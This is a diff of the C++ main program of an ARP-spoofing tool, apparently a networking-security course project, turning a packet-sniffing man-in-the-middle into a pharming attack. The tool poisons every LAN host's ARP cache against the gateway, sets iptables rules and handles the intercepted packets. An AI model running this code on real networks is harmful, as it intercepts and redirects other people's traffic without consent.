@@ -5,6 +5,7 @@
 #include <cerrno>
 #include <cstdlib>
 #include <unistd.h>
+#include <map>
 #include <arpa/inet.h>
 #include <net/if.h>
 #include <net/ethernet.h>
@@ -12,158 +13,82 @@
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/time.h>
-#include <linux/if_packet.h>
-#include <linux/tcp.h>
-#include <linux/ip.h>
-#include <time.h>
+#include <signal.h>
 
-#include <linux/netfilter.h>
+#include <linux/if_packet.h>
+
+#include <linux/netfilter.h>		
 #include <libnetfilter_queue/libnetfilter_queue.h>
 
 #include "arp.h"
 #include "scan.h"
 #include "spoof.h"
-#include "mitm_attack.h"
+#include "filter.h"
+#include "command.h"
+#include "pharm_attack.h"
 
-#define NF_DROP 0
-#define NF_ACCEPT 1
+std::string global_ifname;
 
-using namespace std;
+void SIGINT_handler(int sig)
+{
+    modify_iptables_rule(global_ifname, 0);
+    exit(EXIT_SUCCESS);
+}
 
 /**
  * target all the neighbors in the local network
  * @param gateway_ip the ip address of gateway in std::string
  * @param answered_list the list of all the hosts in the local area network
  * @param spoof_operator the spoof operator
+ * @param filter_operator the filter operator
  */
-
-struct nfq_handle *h;
-struct nfq_q_handle *qh;
-struct nfnl_handle *nh;
-void fetch_information(struct nfq_handle *h, struct nfq_q_handle *qh, struct nfnl_handle *nh, int fd);
-int fd;
-
-void arp_spoofing(string gateway_ip, vector<pair<string, string>> answered_list, SpoofOperator *spoof_operator) {
+void arp_spoofing(std::string gateway_ip, 
+        std::vector<std::pair<std::string, std::string>> answered_list,
+        SpoofOperator *spoof_operator, FilterOperator *filter_operator)
+{
     // run for 100 iterations
+    int nbytes;
+    filter_operator->set_timeout(1, 0);
+
     for (int t = 0; t < 100; t++) {
-        std::cout << "spoofing iteration: " << t << std::endl;
-
-        //simultaenously fetch the HTTP packets from the gateway and the hosts
-        fetch_information(h, qh, nh, fd);
-
+        // std::cout << "spoofing iteration: " << t << std::endl;
         for (auto i = 0; i < answered_list.size(); i++) {
             if (answered_list[i].first != gateway_ip) {
                 spoof_operator->attack(answered_list[i].first, gateway_ip);
                 spoof_operator->attack(gateway_ip, answered_list[i].first);
             }
         }
-        sleep(2);
-    }
-}
-
-//參數分別是代表指向netfilter queue的指標、代表netfilter message的指標、代表netfilter data的指標、使用者資料
-static int Callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
-
-    struct nfqnl_msg_packet_hdr *ph;  //代表netfilter packet header的指標
-    unsigned char *payload; //代表netfilter payload的指標
-    int ret; //代表回傳值的變數
-
-    //取得netfilter packet header
-    ph = nfq_get_msg_packet_hdr(nfa);
-    if (ph){
-        //取得netfilter packet ID
-        printf("Received packet with ID %u\n", ntohl(ph->packet_id));
-    }
-    
-    //取得netfilter payload
-    ret = nfq_get_payload(nfa, &payload);
-    if (ret >= 0)
-    {   //印出netfilter payload的長度
-        printf("Payload Length: %d\n", ret);
-
-        //印出netfilter payload的內容
-        for (int i = 0; i < ret; i++){
-            printf("%c", payload[i]);
+        while (true) {
+            nbytes = filter_operator->receive();
+            if (nbytes < 0) {
+                if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    // timeout
+                    break;
+                } else {
+                    perror("filter_operator->recv() failed");
+                    exit(EXIT_FAILURE);
+                }
+            } else {
+                filter_operator->handle_packet(nbytes);
+            }
         }
+        // process data
+        sleep(1);
     }
-    printf("\n");
-
-    return 0;
 }
 
-void fetch_information(struct nfq_handle *h, struct nfq_q_handle *qh, struct nfnl_handle *nh, int fd){
-    int rv; //代表回傳值的變數
-    char buf[4096] __attribute__((aligned)); //for packet data
-    
-    //open libraray handle
-    h = nfq_open();
-    if (!h){
-        fprintf(stderr, "Error during nfq_open()\n");
-        exit(1);
-    }
-
-    //unbinding existing nf_queue handler for AF_INET (if any)
-    if (nfq_unbind_pf(h, AF_INET) < 0){
-        fprintf(stderr, "Error during nfq_unbind_pf()\n");
-        exit(1);
-    }
-
-    //binding nfnetlink_queue as nf_queue handler for AF_INET
-    if (nfq_bind_pf(h, AF_INET) < 0){
-        fprintf(stderr, "Error during nfq_bind_pf()\n");
-        exit(1);
-    }
-
-    //binding this socket to queue '0'
-    qh = nfq_create_queue(h, 0, &Callback, NULL);
-    if (!qh){
-        fprintf(stderr, "Error during nfq_create_queue()\n");
-        exit(1);
-    }
-
-    //setting copy_packet mode
-    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0){
-        fprintf(stderr, "Can't set packet_copy mode\n");
-        exit(1);
-    }
-
-    //get netlink handle
-    nh = nfq_nfnlh(h);
-    if (!nh)
-    {
-        fprintf(stderr, "Error during nfq_nfnlh()\n");
-        exit(1);
-    }
-
-    //get file descriptor associated with the nfqueue
-    fd = nfq_fd(h);
-    if (!fd)
-    {
-        fprintf(stderr, "Error getting file descriptor for nfqueue\n");
-        exit(1);
-    }
-
-    //receive packets from the nfqueue
-    if(rv = recv(fd, buf, sizeof(buf), 0)>0){
-        nfq_handle_packet(h, buf, rv);
-    }
-    
-    //destroy queue handle
-    nfq_destroy_queue(qh);
-    nfq_close(h);
-    
-}
-
-
-int main() {
+int main()
+{
     std::string sender_mac, target_mac;
     std::string sender_ip, target_ip, netmask, ifname;
     std::string gateway_ip;
     
     // iterate through all network interfaces
     // stops if ifname != "lo"
+    signal(SIGINT, SIGINT_handler);
     get_network_interface_info(sender_ip, netmask, sender_mac, ifname);
     gateway_ip = get_gateway(ifname);
+    global_ifname = ifname;
 
     std::vector<std::string> candidates;
     std::vector<std::pair<std::string, std::string>> answered_list;
@@ -189,7 +114,7 @@ int main() {
     // set timeout
     // don't know how to set the actual timeout window
     arp_operator.clear_buffer();
-    arp_operator.set_timeout(2, 0);
+    arp_operator.set_timeout(1, 0);
     int nbytes;
     std::string host_ip, host_mac;
 
@@ -235,12 +160,14 @@ int main() {
         exit(EXIT_FAILURE);
     }
 
+    FilterOperator filter_operator;
+
     arp_operator.prepare_unicast();
     arp_operator.prepare_header_values();
 
-    arp_spoofing(gateway_ip, answered_list, &spoof_operator);
+    modify_iptables_rule(ifname, 1);
+    arp_spoofing(gateway_ip, answered_list, &spoof_operator, &filter_operator);
+    modify_iptables_rule(ifname, 0);
 
     return 0;
 }
-
-
